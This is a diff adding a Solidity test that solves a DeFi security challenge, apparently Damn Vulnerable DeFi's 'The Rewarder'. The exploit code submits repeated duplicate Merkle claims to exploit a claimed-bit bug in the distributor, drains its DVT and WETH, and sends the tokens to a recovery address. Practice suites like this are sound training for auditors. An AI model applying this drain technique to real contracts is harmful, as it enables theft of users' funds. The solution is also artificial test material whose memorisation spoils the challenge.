@@ -148,7 +148,70 @@ contract TheRewarderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_theRewarder() public checkSolvedByPlayer {
-        
+        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
+        merkle = new Merkle();
+        dvtRoot = merkle.getRoot(dvtLeaves);
+        wethRoot = merkle.getRoot(wethLeaves);
+
+        uint256 playerIndex = 188; // Can be found in the json file
+        bytes32[] memory playerDvtProof = merkle.getProof(dvtLeaves, 188);
+        bytes32[] memory playerWethProof = merkle.getProof(wethLeaves, 188);
+
+        // Bug in Distribution#claimRewards: if the next token to claim in the
+        // `inputClaims` is the same as the previous one, bitsSet will be
+        // incremented, as a result `_setClaimed` will always return true even the
+        // token has been claimed by the player.
+        //
+        // 11524763827831882 is the amount claimable by the player as in the json file
+        uint256 dvtIterations = dvt.balanceOf(address(distributor)) / 11524763827831882;
+
+        console.log("DVT iterations: %s", dvtIterations);
+
+        Claim[] memory claims = new Claim[](dvtIterations);
+
+        claims[0] = Claim({
+            batchNumber: 0, // claim corresponds to first DVT batch
+            amount: 11524763827831882,
+            tokenIndex: 0, // claim corresponds to first token in `tokensToClaim` array
+            proof: playerDvtProof
+            });
+
+        for (uint256 i = 0; i < dvtIterations; i++) {
+            claims[i] = claims[0];
+        }
+
+        IERC20[] memory tokensToClaim = new IERC20[](1);
+        tokensToClaim[0] = IERC20(address(dvt));
+
+        distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});
+
+        // Do the same for WETH
+        uint256 wethIterations = weth.balanceOf(address(distributor)) / 1171088749244340;
+
+        console.log("WETH iterations: %s", wethIterations);
+
+        Claim[] memory wethClaims = new Claim[](wethIterations);
+        wethClaims[0] = Claim({
+            batchNumber: 0, // claim corresponds to first WETH batch
+            amount: 1171088749244340,
+            tokenIndex: 0, // claim corresponds to second token in `tokensToClaim` array
+            proof: playerWethProof
+        });
+
+        for (uint256 i = 0; i < wethIterations; i++) {
+            wethClaims[i] = wethClaims[0];
+        }
+        IERC20[] memory wethTokensToClaim = new IERC20[](1);
+        wethTokensToClaim[0] = IERC20(address(weth));
+
+        distributor.claimRewards({inputClaims: wethClaims, inputTokens: wethTokensToClaim});
+
+        console.log("Player DVT balance:", dvt.balanceOf(player));
+        console.log("Player WETH balance:", weth.balanceOf(player));
+
+        dvt.transfer(recovery, dvt.balanceOf(player));
+        weth.transfer(recovery, weth.balanceOf(player));
     }
 
     /**
